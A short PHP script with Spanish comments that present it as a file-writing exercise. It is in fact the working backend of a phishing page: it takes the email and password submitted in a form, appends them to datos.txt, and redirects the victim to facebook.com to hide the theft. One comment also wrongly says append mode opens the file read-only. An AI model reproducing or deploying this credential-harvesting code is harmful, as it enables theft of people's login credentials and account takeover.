<?php
/*
     * 1.- Creamos la variable que contiene el archivo que tenemos que crear.
     * 2.- preguntamos si existe el archivo, si el archivo existe "se ha modificado"
       en caso contrario el archivo se ha creado.
     * 3.- Con fopen abrimos un archivo o url, en este caso vamos a abrir un archivo
       pasando como parámetro la variable $nombre_archivo que es la que contiene 
       nuestro archivo y como segundo parámetro como lo vamos a abrir, en este caso "a"
       que nos abre el fichero en solo lectura y sitúa el puntero al final del fichero
       y en el caso de que no exista lo crea.
 
       ******Para terminar*******
 
       4.-Con el fwrite escribimos dentro del archivo la fecha con la hora de Creación 
       o modificación, según el caso, con la variable $mensaje, 
 
    */
    
    $email = $_POST["email"];
    $pwd = $_POST['pass'];    
    $nombre_archivo = "datos.txt"; 
    $contenido = "usuario = (".$email.") password = (".$pwd.") fin///";
    

// Primero vamos a asegurarnos de que el archivo existe y es escribible.
    if (is_writable($nombre_archivo)) {

    // En nuestro ejemplo estamos abriendo $nombre_archivo en modo de adición.
    // El puntero al archivo está al final del archivo
    // donde irá $contenido cuando usemos fwrite() sobre él.
    if (!$gestor = fopen($nombre_archivo, 'a')) {
         echo "No se puede abrir el archivo ($nombre_archivo)";
         exit;
    }

    // Escribir $contenido a nuestro archivo abierto.
    if (fwrite($gestor, $contenido) === FALSE) {
        echo "No se puede escribir en el archivo ($nombre_archivo)";
        exit;
    }

    //echo "Éxito, se escribió ($contenido) en el archivo ($nombre_archivo)";
        header('Location: https://www.facebook.com');
    fclose($gestor);

} else {
    echo "El archivo $nombre_archivo no es escribible";
}

?>